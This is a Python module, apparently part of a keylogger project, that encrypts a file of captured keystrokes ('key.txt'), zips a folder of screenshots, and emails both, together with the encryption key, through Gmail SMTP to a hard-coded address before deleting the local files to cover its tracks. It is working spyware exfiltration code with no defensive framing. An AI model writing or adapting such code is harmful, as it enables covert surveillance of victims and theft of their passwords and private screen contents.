import smtplib
import os
import shutil
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import Encryption
import Save_to_file
import PrintScreen


path = os.path.dirname(os.path.abspath(__file__))
script_path_key = os.path.join(path, 'key.txt')
script_path_encryptkey = os.path.join(path, 'encryptkey.txt')

def sendmail():
    Encryption.crypt_file(script_path_key)

    sender = "Jan.Adamczewski.Pawel@gmail.com"
    receiver = sender
    password = ""
    body = "Data: "

    msg = MIMEMultipart()

    msg.attach(MIMEText(body, 'plain'))

    #załączanie pliku key
    file = script_path_key
    with open(file, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)
    part.add_header("Content-Disposition", f"attachment; filename={file}")
    msg.attach(part)

    #załącznik z kluczem
    file1 = script_path_encryptkey
    with open(file1, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)
    part.add_header("Content-Disposition", f"attachment; filename={file1}")
    msg.attach(part)

    shutil.make_archive("screens", 'zip', "screens")
    zip_path = os.path.join(path, 'screens.zip')

    with open(zip_path, "rb") as file:
        attachment = MIMEBase('application', 'zip')
        attachment.set_payload(file.read())
        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', 'attachment', filename='screens.zip')
        msg.attach(attachment)

    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        server.login(sender, password)
        server.sendmail(sender, receiver, msg.as_string())
        server.close()
        clear()
        return True
    except Exception as error:
        print(error)
        return False


def clear():
    zip_path = os.path.join(path, 'screens.zip')
    Save_to_file.clear_key()
    Encryption.clear()
    PrintScreen.clear()
    os.remove(zip_path)










